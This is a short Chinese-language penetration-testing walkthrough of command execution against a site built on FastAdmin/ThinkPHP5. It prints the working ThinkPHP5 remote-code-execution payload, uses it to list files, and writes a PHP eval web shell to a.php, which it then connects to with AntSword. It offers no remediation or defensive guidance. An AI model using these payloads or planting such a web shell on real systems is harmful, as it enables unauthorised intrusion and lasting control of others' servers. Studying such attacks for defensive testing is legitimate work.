# 未知攻焉知防-命令执行
命令执行漏洞概念：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</br>
## 目标站只有一个登陆窗口
F12查看下源代码寻找一下蛛丝马迹</br>

发现了一个url 为 fastadmin官网</br>
![1.jpg](https://i.loli.net/2019/06/10/5cfe09cd4290340159.jpg)</br>
里面介绍到 fastadmin 基于ThinkPHP5和Bootstrap的极速后台开发框架</br>
![2.jpg](https://i.loli.net/2019/06/10/5cfe09cd6edd964825.jpg)</br>
由此可试试使用最新的ThinkPHP5 命令执行漏洞进行渗透测试</br>
基本payload</br>
```
_method=__construct&filter=system&a={command}
```
测试发下代码执行成功</br>
![3.jpg](https://i.loli.net/2019/06/10/5cfe0a6b5240c79310.jpg)</br>
### 接下来是写马过程.</br>
首先查看下当前目录（windows系统）</br>
```
_method=__construct&filter=system&a=dir
```
![5cfe0abe14ec314843.jpg.jpg](https://i.loli.net/2019/06/10/5cfe0abe14ec314843.jpg)</br>
这里有两种方法写入木马 一种是偷偷写入到已经存在的文件下面，另一种就是新建一个文件</br>
这里选择新建一个(ehco xxx > a.php)  追加写法的话:(echo xxx >> a.php)</br>
```
_method=__construct&filter=system&a=echo "Ra<?php @eval($_POST['A']);?>" >a.php
```
![4.jpg](https://i.loli.net/2019/06/10/5cfe09cd4ec5d69059.jpg)</br>
访问a.php 200 回显Ra成功</br>
![5.jpg](https://i.loli.net/2019/06/10/5cfe09f7e990d81101.jpg)</br>
蚁剑连接</br>
![6.jpg](https://i.loli.net/2019/06/10/5cfe09cd65c5598288.jpg)</br>
